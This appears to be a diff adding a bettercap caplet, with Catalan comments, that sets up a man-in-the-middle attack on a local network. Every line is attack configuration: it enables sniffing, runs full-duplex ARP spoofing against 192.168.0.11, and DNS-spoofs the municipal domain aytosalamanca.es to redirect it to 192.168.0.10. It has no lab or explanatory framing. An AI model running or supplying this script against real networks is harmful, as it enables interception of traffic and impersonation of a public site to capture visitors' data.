@@ -1,0 +1,18 @@
+#Activa l'exploració de la xarxa.
+net.probe on 
+#Estableix la capacitat de 'olfatejar' el trànsit local de la xarxa.
+set net.sniff.local true 
+#Activa l'olfateig del trànsit de xarxa.
+net.sniff on 
+#Configura l'atac d'ARP spoofing en mode de dúplex complet.
+set arp.spoof.full-duplex true 
+#Estableix l'objectiu de l'atac d'ARP spoofing a la direcció IP 192.168.0.11.
+set arp.spoof.targets 192.168.0.11 
+#Activa l'atac d'ARP spoofing.
+arp.spoof on 
+#Configura l'empoisonament DNS pel domini aytosalamanca.es.
+set dns.spoof.domains aytosalamanca.es 
+#Estableix la direcció IP a la qual es redirigirà el trànsit DNS pel domini aytosalamanca.es.
+set dns.spoof.address 192.168.0.10 
+#Activa l'empoisonament DNS.
+dns.spoof on 
